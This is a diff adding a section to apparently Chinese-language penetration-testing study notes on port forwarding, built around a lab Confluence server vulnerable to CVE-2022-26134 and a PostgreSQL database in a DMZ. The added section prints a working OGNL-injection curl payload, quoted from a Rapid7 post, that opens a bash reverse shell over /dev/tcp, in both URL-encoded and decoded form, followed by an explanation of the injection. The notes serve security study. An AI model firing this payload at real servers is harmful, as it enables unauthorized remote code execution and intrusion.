@@ -1179,6 +1179,41 @@ uid=0(root) gid=0(root) groups=0(root),1001(joe)
 **Tunneling**: 將一種協議的流量封裝在另一種協議內，例如 SSH Tunneling，可以把 HTTP 流量包裹在 SSH 連線內，使防火牆只看到 SSH 流量，而無法攔截 HTTP。\
 Add'l info: [Network topology](https://en.wikipedia.org/wiki/Network_topology)
 
-
 ## Port Forwarding with Linux Tools
+Port Forwarding:\
+Port Forwarding 是將一個主機上的某個 Port 設定為監聽流量，並將接收到的數據包轉發到另一個目標地址或端口的技術。在正常的網路環境下，網管可能會設定 Port Forwarding 來讓外部設備能夠存取內部伺服器，例如：\
+- 防火牆可以監聽某個 外部介面的端口，然後將流量轉送到內部伺服器。
+- 家用路由器也常提供 Port Forwarding 功能，允許從外部網路存取內部網路設備。
+
+### A Simple Port Forwarding Scenario
+一台 [Confluence](https://www.atlassian.com/software/confluence) 版本的 Linux Web 伺服器，存在 [CVE-2022-26134](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html) 漏洞: 可以透過身份驗證，取得 RCE\
+Enumeration: 兩個 network interfaces
+- 一張連接到 [WAN](https://en.wikipedia.org/wiki/Wide_area_network)（廣域網路，模擬企業內部網路或互聯網），我們的 Kali 機器與它在同一個網段內，能夠直接連線
+- 另一張連接到內部的 [DMZ](https://en.wikipedia.org/wiki/DMZ_(computing))（非軍事區，Demilitarized Zone），這是一個受限制的內部網段
+
+在 Confluence 設定檔中，發現了一組 PostgreSQL 資料庫（PGDATABASE01） 的 IP 位址和登入憑證，該資料庫位於 DMZ 內。\
+網路架構如下圖：\
+![image](https://hackmd.io/_uploads/SkTnKHxs1l.png)
+
+CONFLUENCE01 跨越 WAN 和 DMZ，可在兩個 networks 上進行通訊。 CONFLUENCE01 也在監聽 TCP port 8090 ; PGDATABASE01 也附加了 open socket，說明有東西正在監聽 TCP port 5432（**可能是 PostgreSQL 伺服器，因為預設連接埠是 5432**）。
+
+目標： 利用我們在 CONFLUENCE01 上找到的憑證，嘗試從 Kali 機器連接到 PGDATABASE01 上的這個 PostgreSQL 連接埠。
+
+### Setting Up the Lab Environment
+為了存取 CONFLUENCE01，我們需要利用 Confluence Web 應用程式中的命令執行漏洞來取得 Reverse shell。
+在 [Rapid7](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) 的 blog ，其中包含 [cURL](https://curl.se/) cmd 和 [proof-of-concept](https://en.wikipedia.org/wiki/Proof_of_concept) payload，該有效 payload 聲稱利用該漏洞並返回反向 shell
+
+- example payload from the Rapid7 blog post
+```
+curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+> curl-vhttp://10.0.0.28:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
+
+在不了解其功能的情況下，先弄清楚這個 proof-of-concept 中發生了什麼
+> OGNL injection
+
+>[!Note]
+> OGNL: [Object-Graph Notation Language](https://en.wikipedia.org/wiki/OGNL)
+> 一種 Java 應用程式中常用的表達語言。當應用程式以將使用者輸入傳遞給 OGNL 表達式解析器的方式處理使用者輸入時，就會發生 OOGNL injection。由於可以在 OGNL 表達式內執行 Java 程式碼，因此可以使用 OGNL injection 來執行任意程式碼。\
+OGNL 注入負載本身使用 Java 的 ProcessBuilder 類別來產生Bash互動式反向 shell（bash -i）。
 
